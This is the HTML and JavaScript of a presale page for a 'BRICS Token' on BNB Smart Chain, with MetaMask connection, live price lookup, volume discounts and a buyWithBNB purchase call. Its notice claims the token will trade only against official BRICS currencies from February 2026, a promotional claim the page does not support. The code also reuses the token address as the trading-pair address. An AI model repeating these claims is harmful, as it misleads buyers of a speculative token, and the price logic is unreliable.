<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Buy BRICS Token</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: "Inter", Arial, sans-serif;
      background: linear-gradient(180deg, #eaf5ff 0%, #f8fbff 100%);
      text-align: center;
      padding: 30px;
      color: #111;
    }
    .card {
      background: #fff;
      border-radius: 14px;
      padding: 26px;
      max-width: 820px;
      margin: auto;
      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
    }
    h2 { color: #007bff; margin-bottom: 6px; }
    input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border:1px solid #ccc; font-size:16px; }
    button { background:#007bff; color:#fff; cursor:pointer; font-weight:600; border:none; }
    button:disabled { opacity:0.6; cursor:not-allowed; }
    .copy-btn { background:transparent; border:none; color:#007bff; cursor:pointer; margin-left:8px; font-size:14px; }
    .info-box { background:#f5f8ff; border-radius:10px; padding:14px; margin-top:18px; font-size:14px; color:#333; line-height:1.6; text-align:left; max-width:720px; margin-left:auto; margin-right:auto; }
    .status { color:#007bff; font-weight:600; margin-top:8px; min-height:22px; }
    .discount-info { margin-top:10px; color:#00a36c; font-weight:700; }
    .price-info { margin-top:10px; color:#333; font-weight:600; }
    .wallet-display { font-size:14px; color:#333; margin-top:8px; }
    hr { border:0; border-top:1px solid #eee; margin:18px 0; }
    /* spinner */
    .spinner {
      display:inline-block;
      width:18px;
      height:18px;
      border:3px solid rgba(0,0,0,0.12);
      border-top-color:#007bff;
      border-radius:50%;
      animation: spin 1s linear infinite;
      vertical-align:middle;
      margin-left:8px;
      visibility:hidden;
    }
    .spinner.visible { visibility: visible; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .meta-row { display:flex; justify-content:center; align-items:center; gap:8px; flex-wrap:wrap; }
    .small-muted { font-size:13px; color:#666; margin-top:6px; }
  </style>
</head>
<body>

  <div class="card">
    <img src="bricslogo.png" alt="BRICS Logo" width="96" />
    <h2>Buy BRICS Token</h2>

    <p style="font-weight:600; margin-bottom:6px;">Please add this contract address to your MetaMask before buying:</p>
    <div class="meta-row" style="justify-content:center; align-items:center;">
      <p id="contractDisplay" style="font-size:16px; font-weight:700; margin:0;"> <span id="contractShort">0xAF20...3037</span></p>
      <button id="copyContract" class="copy-btn">Copy</button>
    </div>
    <div class="small-muted">Add the token contract in MetaMask to see token details before purchase.</div>

    <hr />

    <p style="font-weight:600; margin-top:14px;">Enter amount of BRICS to buy:</p>
    <input id="bricsAmount" type="number" placeholder="e.g. 1000" min="1" />

    <div style="margin-top:6px;">
      <button id="connectBtn">Connect Wallet</button>
      <div class="wallet-display" id="walletInfo"></div>
    </div>

    <button id="buyBtn" disabled style="margin-top:14px;">Buy BRICS</button>

    <div class="price-info" id="priceInfo">Live BRICS price: loading... <span class="spinner" id="priceSpinner"></span></div>
    <div class="discount-info" id="discountInfo"></div>
    <div class="price-info" id="totalInfo"></div>
    <p id="status" class="status"></p>

    <div class="info-box">
      <strong>Important Notice:</strong><br>
      BRICS Token will be listed in <strong>February 2026</strong> and will only be exchangeable with the official currencies of BRICS member countries.<br><br>
      Accepted payment: <strong>BNB (BEP20)</strong> — Network: <strong>BNB Smart Chain</strong>.<br>
      Price source: PancakeSwap pair (live) and BNB→USD via Binance public API.
    </div>
  </div>

<script>
/* Final BRICS mini dApp (English UI)
   Features:
   - MetaMask connect (BSC)
   - Contract short display + copy
   - Live BRICS price (BNB) from PancakeSwap pair using getReserves()
   - Live BNB->USD price from Binance API
   - Spinner while updating
   - Tiered discount (0% <500, linear to 50% at >=1,000,000)
   - Show total in BNB and USD
   - buyWithBNB() call to contract (user confirms in MetaMask)
*/

const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037"; // show partial only
const PANCAKE_PAIR = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037"; // pair address provided
const CHAIN_ID_BSC = 56;
const WBNB = "0xBB4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase();

const PAIR_ABI = [
  "function getReserves() view returns (uint112,uint112,uint32)",
  "function token0() view returns (address)",
  "function token1() view returns (address)"
];
const BRICS_ABI = ["function buyWithBNB() payable"];

const connectBtn = document.getElementById("connectBtn");
const buyBtn = document.getElementById("buyBtn");
const walletInfo = document.getElementById("walletInfo");
const statusEl = document.getElementById("status");
const discountInfo = document.getElementById("discountInfo");
const priceInfo = document.getElementById("priceInfo");
const totalInfo = document.getElementById("totalInfo");
const copyBtn = document.getElementById("copyContract");
const bricsInput = document.getElementById("bricsAmount");
const contractShort = document.getElementById("contractShort");
const spinner = document.getElementById("priceSpinner");

let provider = null;
let signer = null;
let userAddress = null;
let priceScaled = null; // BigNumber scaled by 1e18 (BNB per BRICS)
let bricsPriceBNB = 0;  // human
let bnbUsdPrice = 0;    // number
let updateTimer = null;

// show partial contract address (first 6, last 4)
function shortAddr(addr) {
  if (!addr || addr.length < 10) return addr;
  return addr.slice(0,6) + "..." + addr.slice(-4);
}
contractShort.textContent = shortAddr(BRICS_CONTRACT);

// copy contract
copyBtn.onclick = async () => {
  try {
    await navigator.clipboard.writeText(BRICS_CONTRACT);
    alert("BRICS contract address copied to clipboard");
  } catch (e) {
    alert("Copy failed. Please copy manually: " + BRICS_CONTRACT);
  }
};

// helpers
function setStatus(txt) { statusEl.textContent = txt; }
function showSpinner(show) { if (show) spinner.classList.add('visible'); else spinner.classList.remove('visible'); }

// connect wallet and ensure BSC
async function connectWallet() {
  if (!window.ethereum) { alert("Please install MetaMask."); return; }
  provider = new ethers.providers.Web3Provider(window.ethereum);
  try {
    const net = await provider.getNetwork();
    if (net.chainId !== CHAIN_ID_BSC) {
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ethers.utils.hexValue(CHAIN_ID_BSC) }]
        });
      } catch (switchErr) {
        alert("Please switch to BSC (BNB Smart Chain) in MetaMask and reconnect.");
        throw switchErr;
      }
    }
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    walletInfo.textContent = shortAddr(userAddress);
    connectBtn.textContent = "Connected";
    connectBtn.disabled = true;
    setStatus("Wallet connected");
    updateBuyBtnState();
  } catch (e) {
    console.error(e);
    setStatus("Connection failed: " + (e.message || e));
  }
}

// discount function
function calculateDiscount(amount) {
  const a = Number(amount);
  if (!a || a <= 0) return 0;
  if (a < 500) return 0;
  if (a >= 1000000) return 50;
  const ratio = (a - 500) / (1000000 - 500);
  const discount = ratio * 50;
  return Math.round(discount * 100) / 100;
}

// fetch live price (BNB per BRICS) from Pancake pair, returns BigNumber scaled 1e18
async function fetchLivePriceScaled() {
  const rpc = provider || new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
  const pair = new ethers.Contract(PANCAKE_PAIR, PAIR_ABI, rpc);
  const [t0, t1] = await Promise.all([pair.token0(), pair.token1()]);
  const reserves = await pair.getReserves();
  const reserve0 = ethers.BigNumber.from(reserves[0].toString());
  const reserve1 = ethers.BigNumber.from(reserves[1].toString());
  const t0lower = t0.toLowerCase();
  // determine which reserve is WBNB
  let reserveWBNB, reserveBRICS;
  if (t0lower === WBNB) {
    reserveWBNB = reserve0;
    reserveBRICS = reserve1;
  } else if (t1.toLowerCase() === WBNB) {
    reserveWBNB = reserve1;
    reserveBRICS = reserve0;
  } else {
    // fallback: try to guess but if cannot, throw
    console.warn("WBNB not found in pair tokens; token0:", t0, " token1:", t1);
    throw new Error("WBNB not found in pair. Verify pair address.");
  }
  const priceScaledLocal = reserveWBNB.mul(ethers.constants.WeiPerEther).div(reserveBRICS);
  return priceScaledLocal;
}

// fetch BNB->USD price from Binance public API
async function fetchBnbUsd() {
  try {
    const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
    const j = await res.json();
    return parseFloat(j.price);
  } catch (e) {
    console.error("BNB->USD fetch failed", e);
    return null;
  }
}

// update both prices (BNB/BRICS and BNB->USD)
async function updatePrices() {
  try {
    showSpinner(true);
    setStatus("Updating live prices...");
    const [pscaled, bnbusd] = await Promise.allSettled([fetchLivePriceScaled(), fetchBnbUsd()]);
    if (pscaled.status === "fulfilled") {
      priceScaled = pscaled.value;
      bricsPriceBNB = Number(ethers.utils.formatUnits(priceScaled, 18));
    } else {
      console.error("priceScaled error", pscaled.reason);
      priceScaled = null;
      bricsPriceBNB = 0;
    }
    if (bnbusd.status === "fulfilled" && bnbusd.value) {
      bnbUsdPrice = bnbusd.value;
    } else {
      console.warn("BNB->USD not available");
      bnbUsdPrice = 0;
    }
    // update UI
    if (priceScaled) {
      priceInfo.textContent = `Live BRICS price: ${bricsPriceBNB.toFixed(10)} BNB` + (bnbUsdPrice ? ` (~$${(bricsPriceBNB * bnbUsdPrice).toFixed(6)} USD)` : "");
    } else {
      priceInfo.textContent = "Live BRICS price: unavailable";
    }
    // refresh computed totals if user entered amount
    refreshPricingDisplay();
    updateBuyBtnState();
    setStatus("");
  } catch (e) {
    console.error(e);
    setStatus("Price update error");
  } finally {
    showSpinner(false);
  }
}

// set periodic update
updateTimer = setInterval(updatePrices, 10000);
updatePrices(); // initial

// compute total wei to send for given bricsAmount and discount
function computeTotalWei(bricsAmount, discountPercent) {
  if (!priceScaled) throw new Error("price not ready");
  const amountUnits = ethers.utils.parseUnits(String(bricsAmount), 18); // decimals 18
  const multiplierBP = Math.round((1 - (discountPercent/100)) * 10000);
  const priceAfterScaled = priceScaled.mul(multiplierBP).div(10000);
  const totalWei = amountUnits.mul(priceAfterScaled).div(ethers.constants.WeiPerEther);
  return totalWei; // BigNumber
}

// refresh UI displays when input changes
function refreshPricingDisplay() {
  const val = Number(bricsInput.value);
  if (!val || val <= 0) {
    discountInfo.textContent = "";
    totalInfo.textContent = "";
    return;
  }
  const disc = calculateDiscount(val);
  if (!priceScaled) {
    discountInfo.textContent = `Discount: ${disc}%`;
    totalInfo.textContent = `Total: price unavailable`;
    return;
  }
  const priceAfter = bricsPriceBNB * (1 - disc/100);
  const totalWei = computeTotalWei(val, disc);
  const totalBNBstr = ethers.utils.formatUnits(totalWei, 18);
  const totalBNBnum = Number(totalBNBstr);
  const totalUSD = bnbUsdPrice ? (totalBNBnum * bnbUsdPrice) : null;
  discountInfo.textContent = `Discount: ${disc}% | Price per BRICS ≈ ${priceAfter.toFixed(10)} BNB`;
  totalInfo.textContent = `Total ≈ ${Number(totalBNBstr).toFixed(8)} BNB` + (totalUSD ? ` (~$${totalUSD.toFixed(2)} USD)` : "");
}

// enable/disable buy button
function updateBuyBtnState() {
  const hasAmt = Number(bricsInput.value) > 0;
  const connected = !!signer;
  const priceReady = !!priceScaled;
  buyBtn.disabled = !(hasAmt && connected && priceReady);
}

// buy flow
async function handleBuy() {
  try {
    const amount = Number(bricsInput.value);
    if (!amount || amount <= 0) { setStatus("Enter a valid BRICS amount."); return; }
    const disc = calculateDiscount(amount);
    if (!priceScaled) { setStatus("Live price not available."); return; }
    const totalWei = computeTotalWei(amount, disc);
    if (totalWei.lte(0)) { setStatus("Calculated amount is zero. Check price/amount."); return; }

    if (!provider || !signer) { setStatus("Connect wallet first."); return; }
    const contract = new ethers.Contract(BRICS_CONTRACT, BRICS_ABI, signer);
    setStatus("Please confirm the transaction in your wallet...");
    const tx = await contract.buyWithBNB({ value: totalWei });
    setStatus("Transaction sent. Waiting for confirmation...");
    await tx.wait();
    setStatus("✅ Purchase successful. TX: " + tx.hash);
  } catch (e) {
    console.error(e);
    setStatus("Transaction failed: " + (e?.data?.message || e?.message || e));
  }
}

// events
connectBtn.onclick = connectWallet;
buyBtn.onclick = handleBuy;
bricsInput.oninput = () => { refreshPricingDisplay(); updateBuyBtnState(); };

// handle account/network changes
if (window.ethereum) {
  window.ethereum.on("accountsChanged", (accounts) => {
    if (accounts.length === 0) {
      signer = null; provider = null; userAddress = null;
      walletInfo.textContent = "";
      connectBtn.disabled = false; connectBtn.textContent = "Connect Wallet";
      setStatus("Wallet disconnected.");
      buyBtn.disabled = true;
    } else {
      userAddress = accounts[0];
      walletInfo.textContent = shortAddr(userAddress);
      connectBtn.textContent = "Connected"; connectBtn.disabled = true;
      setStatus("Account changed.");
      updateBuyBtnState();
    }
  });
  window.ethereum.on("chainChanged", (chainIdHex) => {
    setStatus("Network changed. Please reconnect if needed.");
    // optional: location.reload();
  });
}
</script>
</body>
</html>
